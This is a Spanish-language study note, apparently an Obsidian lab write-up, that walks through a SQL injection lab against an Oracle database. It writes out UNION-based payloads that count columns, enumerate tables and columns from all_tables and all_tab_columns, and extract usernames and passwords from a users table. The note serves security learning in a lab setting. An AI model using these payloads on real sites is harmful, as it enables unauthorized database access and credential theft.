---
title: "9 - SQL injection attack, listing the database contents on Oracle"
date: 2026-08-27
tags:
  - self-study
  - security-penetration-testing
  - avanzado
status: verified
author: "Juan José Restrepo Rosero"
last_updated: 2026-08-27
---

Tenemos el siguiente laboratorio:
![[Pasted image 20240517093647.png]]
Lo primero será evaluar el número de columnas, donde vemos que hay 2:
```bash
Lifestyle'+UNION+SELECT+'NULL','NULL'+FROM+dual
```
![[Pasted image 20240517093848.png]]
Ahora, para conocer el nombre de las tablas, usamos la siguiente query:
```bash
Lifestyle'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```
![[Pasted image 20240517093932.png]]
Si miramos el código fuente, vemos una tabla de usuarios:
![[Pasted image 20240517094906.png]]
Ahora, vemos la tabla USERS_MWEPIF, la cual puede ser interesante, por lo que usamos el siguiente payload para acceder a su información:
```bash
Lifestyle'UNION+SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_MWEPIF'-- -
```
Y habremos obtenido las credenciales:
```bash
PASSWORD_SJGWAQ
USERNAME_IBGKKV
```
![[Pasted image 20240517095340.png]]
Para ver las credenciales de los usuarios, usamos la siguiente consulta utilizando la información obtenida anteriormente:
```bash
Lifestyle'UNION+SELECT USERNAME_IBGKKV, PASSWORD_SJGWAQ FROM USERS_MWEPIF-- -
```
![[Pasted image 20240517095640.png]]
Y ya habremos resuelto el laboratorio:
![[Pasted image 20240517095704.png]]

<!-- self-study-knowledge-context -->
## Contexto de estudio
- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
> [!warning] Uso autorizado
> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
